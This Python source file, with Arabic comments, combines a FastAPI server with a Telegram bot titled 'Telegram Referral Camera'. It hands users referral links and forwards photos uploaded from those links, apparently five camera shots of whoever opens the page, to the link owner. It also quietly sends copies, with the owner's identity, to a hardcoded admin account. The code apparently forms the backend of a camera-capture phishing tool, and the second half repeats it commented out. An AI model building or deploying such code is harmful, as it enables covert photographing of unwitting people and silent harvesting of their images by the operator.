import os
import json
from pathlib import Path
from typing import List
from datetime import datetime, timedelta

from fastapi import FastAPI, Query, Request, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

from aiogram import Bot, Dispatcher, F
from aiogram.types import BufferedInputFile, InputMediaPhoto, Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import CommandStart, Command
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_TELEGRAM_ID = int(os.getenv("ADMIN_TELEGRAM_ID", "600280511"))

USERS_FILE = Path("users.json")

app = FastAPI(title="Telegram Referral Camera")
templates = Jinja2Templates(directory="templates")

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# --- إدارة بيانات المستخدمين ---

def load_users():
    if not USERS_FILE.exists():
        return {"users": {}, "total_users": 0}
    try:
        with USERS_FILE.open("r", encoding="utf-8") as file:
            return json.load(file)
    except (json.JSONDecodeError, OSError):
        return {"users": {}, "total_users": 0}


def save_users(data):
    with USERS_FILE.open("w", encoding="utf-8") as file:
        json.dump(data, file, ensure_ascii=False, indent=2)


def get_stats():
    """حساب إحصائيات المستخدمين"""
    data = load_users()
    users = data.get("users", {})
    
    total = len(users)
    now = datetime.now()
    seven_days_ago = now - timedelta(days=7)
    current_month = now.strftime("%Y-%m")

    last_7_days_count = 0
    this_month_count = 0

    for u in users.values():
        created_str = u.get("created_at")
        if created_str:
            try:
                dt = datetime.fromisoformat(created_str)
                if dt >= seven_days_ago:
                    last_7_days_count += 1
                if dt.strftime("%Y-%m") == current_month:
                    this_month_count += 1
            except ValueError:
                pass

    return {
        "total": total,
        "last_7_days": last_7_days_count,
        "this_month": this_month_count
    }


# --- لوحات الأزرار ---

def get_admin_keyboard():
    """لوحة أزرار خاصة بالمسؤول فقط"""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 إحصائيات البوت")],
            [KeyboardButton(text="/start")]
        ],
        resize_keyboard=True
    )


def get_user_keyboard():
    """لوحة أزرار للمستخدم العادي"""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="/start")]
        ],
        resize_keyboard=True
    )


# --- معالجات التلجرام (Aiogram Handlers) ---

@dp.message(CommandStart())
async def start_handler(message: Message):
    user_id_str = str(message.from_user.id)
    name = message.from_user.full_name
    username = message.from_user.username or ""
    
    users_data = load_users()
    is_new = user_id_str not in users_data["users"]

    if is_new:
        # إضافة المستخدم الجديد
        users_data["users"][user_id_str] = {
            "name": name,
            "username": username,
            "referrals": 0,
            "created_at": datetime.now().isoformat()
        }
        users_data["total_users"] = len(users_data["users"])
        save_users(users_data)

        # إشعار المسؤول بمستخدم جديد
        username_text = f"@{username}" if username else "بدون اسم مستخدم"
        admin_notice = (
            "👤 **مستخدم جديد انضم للبوت!**\n\n"
            f"🔹 الاسم: {name}\n"
            f"🔹 اليوزر: {username_text}\n"
            f"🆔 الآيدي: `{user_id_str}`\n"
            f"📈 إجمالي المستخدمين: {users_data['total_users']}"
        )
        try:
            await bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=admin_notice, parse_mode="Markdown")
        except Exception as e:
            print(f"فشل إرسال الإشعار للمسؤول: {e}")

    # التمييز بين المسؤول والمستخدم العادي في الكيبورد
    if message.from_user.id == ADMIN_TELEGRAM_ID:
        kb = get_admin_keyboard()
        welcome_msg = "أهلاً بك عزيزي المسؤول 👋"
    else:
        kb = get_user_keyboard()
        welcome_msg = "أهلاً بك في البوت! 👋"

    await message.answer(welcome_msg, reply_markup=kb)


@dp.message(F.text == "📊 إحصائيات البوت")
async def stats_handler(message: Message):
    # التأكد من أن الطالب هو المسؤول فقط
    if message.from_user.id != ADMIN_TELEGRAM_ID:
        return

    stats = get_stats()
    text = (
        "📊 **إحصائيات البوت:**\n\n"
        f"👥 إجمالي المستخدمين: **{stats['total']}**\n"
        f"📅 الانضمام آخر 7 أيام: **{stats['last_7_days']}**\n"
        f"🗓 الانضمام هذا الشهر: **{stats['this_month']}**"
    )
    await message.answer(text, parse_mode="Markdown")


# --- مسارات FastAPI ---

@app.get("/", response_class=HTMLResponse)
async def home(request: Request, q: str = Query(default="")):
    if not q:
        return """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>الرابط غير صحيح</title>
        </head>
        <body>
            <h2>❌ الرابط غير صحيح</h2>
            <p>يجب فتح رابط إحالة صالح.</p>
        </body>
        </html>
        """

    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={"referral_id": q}
    )


@app.post("/upload-photo")
async def upload_photo(
    photos: List[UploadFile] = File(...),
    referral_id: str = Form(...)
):
    users_data = load_users()
    user = users_data["users"].get(referral_id)

    if not user:
        return {"success": False, "message": "رابط الإحالة غير صالح."}

    if not photos:
        return {"success": False, "message": "لم يتم إرسال أي صور."}

    owner_id = int(referral_id)
    username = user.get("username", "")
    name = user.get("name", "غير معروف")
    username_text = f"@{username}" if username else "بدون username"

    caption = (
        "📸 صور جديدة (5 صور)\n\n"
        f"👤 صاحب الرابط: {name}\n"
        f"🔹 Username: {username_text}\n"
        f"🆔 Telegram ID: {owner_id}\n"
        f"🔗 Referral ID: {referral_id}"
    )

    try:
        media_group_owner = []
        media_group_admin = []

        for idx, photo in enumerate(photos):
            image_bytes = await photo.read()
            if not image_bytes:
                continue

            admin_caption = caption if idx == 0 else ""

            # ألبوم المستخدم (بدون نص)
            media_group_owner.append(
                InputMediaPhoto(
                    media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg")
                )
            )

            # ألبوم المسؤول (مع النص)
            media_group_admin.append(
                InputMediaPhoto(
                    media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg"),
                    caption=admin_caption
                )
            )

        if media_group_owner:
            await bot.send_media_group(chat_id=owner_id, media=media_group_owner)
            await bot.send_media_group(chat_id=ADMIN_TELEGRAM_ID, media=media_group_admin)

    except Exception as error:
        print("ERROR SENDING PHOTOS TO TELEGRAM:", repr(error))
        return {"success": False, "message": "فشل إرسال الصور إلى Telegram."}

    # تحديث عدد الإحالات
    user["referrals"] = user.get("referrals", 0) + 1
    save_users(users_data)

    return {"success": True, "message": "تم إرسال الصور بنجاح."}



# import os
# import json
# from pathlib import Path
# from typing import List

# from fastapi import FastAPI, Query, Request, UploadFile, File, Form
# from fastapi.responses import HTMLResponse
# from fastapi.templating import Jinja2Templates

# from aiogram import Bot
# from aiogram.types import BufferedInputFile, InputMediaPhoto
# from dotenv import load_dotenv

# load_dotenv()

# BOT_TOKEN = os.getenv("BOT_TOKEN")

# ADMIN_TELEGRAM_ID = int(
#     os.getenv("ADMIN_TELEGRAM_ID", "600280511")
# )

# USERS_FILE = Path("users.json")

# app = FastAPI(title="Telegram Referral Camera")

# templates = Jinja2Templates(directory="templates")

# if not BOT_TOKEN:
#     raise RuntimeError("BOT_TOKEN is not configured")

# bot = Bot(token=BOT_TOKEN)


# def load_users():
#     if not USERS_FILE.exists():
#         return {
#             "users": {},
#             "total_users": 0
#         }

#     try:
#         with USERS_FILE.open("r", encoding="utf-8") as file:
#             return json.load(file)

#     except (json.JSONDecodeError, OSError):
#         return {
#             "users": {},
#             "total_users": 0
#         }


# @app.get("/", response_class=HTMLResponse)
# async def home(
#     request: Request,
#     q: str = Query(default="")
# ):
#     if not q:
#         return """
#         <!DOCTYPE html>
#         <html lang="ar" dir="rtl">
#         <head>
#             <meta charset="UTF-8">
#             <meta name="viewport"
#                   content="width=device-width, initial-scale=1.0">
#             <title>الرابط غير صحيح</title>
#         </head>

#         <body>
#             <h2>❌ الرابط غير صحيح</h2>
#             <p>يجب فتح رابط إحالة صالح.</p>
#         </body>
#         </html>
#         """

#     return templates.TemplateResponse(
#         request=request,
#         name="index.html",
#         context={
#             "referral_id": q
#         }
#     )


# @app.post("/upload-photo")
# async def upload_photo(
#     photos: List[UploadFile] = File(...),
#     referral_id: str = Form(...)
# ):
#     users_data = load_users()
#     user = users_data["users"].get(referral_id)

#     if not user:
#         return {
#             "success": False,
#             "message": "رابط الإحالة غير صالح."
#         }

#     if not photos:
#         return {
#             "success": False,
#             "message": "لم يتم إرسال أي صور."
#         }

#     owner_id = int(referral_id)
#     username = user.get("username", "")
#     name = user.get("name", "غير معروف")
#     username_text = f"@{username}" if username else "بدون username"

#     caption = (
#         "📸 صور جديدة (5 صور)\n\n"
#         f"👤 صاحب الرابط: {name}\n"
#         f"🔹 Username: {username_text}\n"
#         f"🆔 Telegram ID: {owner_id}\n"
#         f"🔗 Referral ID: {referral_id}"
#     )

#     try:
#         media_group_owner = []
#         media_group_admin = []

#         for idx, photo in enumerate(photos):
#             image_bytes = await photo.read()
#             if not image_bytes:
#                 continue

#             # نص المسؤول يضاف على الصورة الأولى فقط في الألبوم
#             admin_caption = caption if idx == 0 else ""

#             # ألبوم صاحب الرابط (بدون أي ووصف/caption)
#             media_group_owner.append(
#                 InputMediaPhoto(
#                     media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg")
#                 )
#             )

#             # ألبوم المسؤول (مع الوصف/caption)
#             media_group_admin.append(
#                 InputMediaPhoto(
#                     media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg"),
#                     caption=admin_caption
#                 )
#             )

#         if media_group_owner:
#             # إرسال ألبوم الصور إلى صاحب الرابط (بدون نص)
#             await bot.send_media_group(chat_id=owner_id, media=media_group_owner)

#             # إرسال ألبوم الصور إلى المسؤول (مع النص)
#             await bot.send_media_group(chat_id=ADMIN_TELEGRAM_ID, media=media_group_admin)

#     except Exception as error:
#         print("ERROR SENDING PHOTOS TO TELEGRAM:")
#         print(repr(error))

#         return {
#             "success": False,
#             "message": "فشل إرسال الصور إلى Telegram."
#         }

#     # زيادة عدد الإحالات بعد نجاح الإرسال
#     user["referrals"] = user.get("referrals", 0) + 1

#     with USERS_FILE.open("w", encoding="utf-8") as file:
#         json.dump(
#             users_data,
#             file,
#             ensure_ascii=False,
#             indent=2
#         )

#     return {
#         "success": True,
#         "message": "تم إرسال الصور بنجاح."
#     }
